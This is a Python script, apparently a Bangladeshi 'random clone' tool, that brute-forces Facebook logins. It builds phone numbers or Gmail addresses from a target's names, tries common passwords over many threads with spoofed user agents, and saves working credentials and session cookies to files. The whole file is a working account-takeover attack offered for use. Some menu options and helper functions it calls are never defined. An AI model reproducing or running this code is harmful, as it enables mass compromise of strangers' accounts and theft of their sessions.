#######+MAKED BY TURAG+#####
#---------MAIN-MODIULS-------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#---------MISSING-MODIUL---------#
#-------COLOR-CODE------#
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
K = '\x1b[1;93m' 
U = '\x1b[1;95m' 
V = '\x1b[1;96m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
uat = []
ugen = []
#--------USER-AGENTS------#
ugen=[]
for ua in range(50000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
#---------LOGO-MENU-------#
logo=("""
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\x1b[1;90m┃  \033[1;91md888888b db    db d8888b.  .d8b.   d888b   \x1b[1;90m ┃
\x1b[1;90m┃  \033[1;32m`~~88~~' 88    88 88  `8D d8' `8b 88' Y8   \x1b[1;90m ┃
\x1b[1;90m┃  \033[1;92m   88    88    88 88oobY' 88ooo88 88  \x1b[1;90m      ┃
\x1b[1;90m┃  \033[1;33m   88    88    88 88`8b   88~~~88 88  ooo  \x1b[1;90m ┃
\x1b[1;90m┃  \033[1;93m   88    88b  d88 88 `88. 88   88 88. ~8~   \x1b[1;90m┃
\x1b[1;90m┃  \033[1;36m   YP    ~Y8888P' 88   YD YP   YP  Y888P   \x1b[1;90m ┃
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: TURAG AHAMED
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTURAG-CYBER-404
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
\033[1;96m═════════════════════════════════════════════
""")
#------MAIN-MENU----#
def o():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/turag.ahmed.9655')
    print(logo)
    print('\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃')
    print("\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ██")
    print("\033[38;5;46m ▊[\033[1;92m\033[1;34m1\033[1;92m] RANDOM NUMBER CLONE [M-1] {BEST}\033[38;5;46m             ██ ")
    print("\033[38;5;46m ▊[\033[1;92m\033[1;34m4\033[1;92m] RANDOM GMAIL CLONE [NEW V-ULTRA]\033[38;5;46m             ██ ")
    print("\033[38;5;46m ▊[\033[1;92m\033[1;34m5\033[1;92m] CONTACT MAIN ADMIN <=>\033[38;5;46m                       ██ ")
    print("\033[38;5;46m ▊[\033[38;5;208m\033[1;34m0\033[1;92m] EXIT\033[38;5;46m                                         ██ ")
    print("\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ██")
    print('\033[92;1m ▊▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃██')
    
    TURAG =input(" \033[1;92m[\033[1;34m➢\033[1;92m]\033[1;92mCHOSSE : ")
    if TURAG == '1':
    	turagrndm()
    if TURAG == '2':
    	turagrndmuid()
    if TURAG == '3':
    	pak() 
    if TURAG == '4':
    	turagrndmgml()
    if TURAG == '5':
    	os.system('xdg-open https://www.facebook.com/turag.ahmed.9655')
    if TURAG == 'F':
    	print('SORRY FILE CLONE IS NOT READY')
    if TURAG == '0':
        os.system('exit')
#-------ADMIN-INFO-MENU-------#
#-----RANDOM-NUMBER-----#
def turagrndm():
    user=[]
    os.system('xdg-open https://facebook.com/groups/623107209180969/')
    os.system('clear')
    print(logo)
    print('[+] SIM CODE BD=> 016 ~ 017 ~ 018 ~ 019')
    tithie = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    tithiex = ''.join(random.choice(string.digits) for _ in range(2))
    tithi = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000 ~ 5000 ~ 10000 ~ 15000 ~ 50000')
    os.system('xdg-open https://github.com/TURAG-CYBER-404/')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as TURAG:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : \033[1;35m'+tithie)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] CRACKING :  \033[1;91m[RANDOM-NUMBER] ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] METHOD :  \033[1;34mM-1 ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY TURAG ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : \033[1;91m'+tl)
        print(50*"=")
        for guru in user:
            uid = tithie+tithiex+tithi+guru
            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire']
            TURAG.submit(rcrack1,uid,pwx,tl)
    print(50*"=")
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(50*"=")
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/ACTIVE.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/DEAD.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");o()
#-------RANDOM-GMAIL------#
def turagrndmgml():
    user=[]
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/623107209180969/')
    print(logo)
    tithie = input(' \033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TARGET FARST NAME ')
    tithiex = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TARGET LAST NAME :')
    print('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]EXAMPLE DOAMIN :\033[1;93m@gmail.com,\033[1;96m@yahoo.com ')
    doamin = input('\033[1;96m[\033[1;93m📧\033[1;96m]\033[1;94mINPUT DOAMING : ')
    limit = int(input('\033[1;92m[✔]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as turag:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] DOMAIN : \033[1;35m{doamin}')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] CRACKING :  \033[1;91m[GMAIL-CLONE] ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] METHOD :  \033[1;34mNEW V-ULTRA ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] FRIST NAME : '+tithie+ ', LAST NAME : '+tithiex)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY TURAG ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : \033[1;91m'+tl)
        print(50*"=")
        for guru in user:
            uid = tithie+tithiex+guru+doamin
            pwx = [tithie,tithiex,tithie+tithiex,tithie+tithiex+'123',tithie+'123',tithie+'1234',tithie+'1122',tithie+'111','bangladesh',tithie+'12345',tithie+guru,tithiex+'123',tithiex+'1234',tithiex+'12345']
            turag.submit(rcrack1,uid,pwx,tl)
    print(50*"=")
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(50*"=")
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;97m/sdcard/ACTIVE.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;97m/sdcard/DEAD.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");o()
#--------UID-CRACK-MENU------#
#-------NUM-GML-CRACK-MENU-----#
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sSEARCHING\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s ~ %s\033[1;31m]\033[1;34m\033[38;5;45mOK ~ \033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'm.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=npp9ZK8WKQqVIDN2lnWnWahd; dpr=3; sb=tJp9ZB-qCq_FfAdPVE7qAM6v; vpd=v1%3B650x360x3; locale=bn_IN; wl_cbv=v2%3Bclient_version%3A2269%3Btimestamp%3A1686195225; m_pixel_ratio=3; wd=980x1769; fr=0q5MsHKJVnJC5AWkg.AWVtFyN3nSyMadmqYLTNH9UKXrQ.BkfhRx.7z.AAA.0.0.Bkgf95.AWVASX2pr_4',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[ACTIVE] {uid} ~> {ps} <=>" +tahunng(cid)+'  \n\033[1;33m [+]\033[1;33mCOOKIE = \033[1;35m'+coki+  ' \n\033[1;33m [+] \033[1;32mUSER AGENT = \033[1;33m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ACTIVE.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print('\033[1;96m[DEAD] \033[1;93m\033[1;96m'+uid+' = '+ps+'   \033[1;93m<=>'+tahunng(cid))
                open('/sdcard/DEAD.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
o()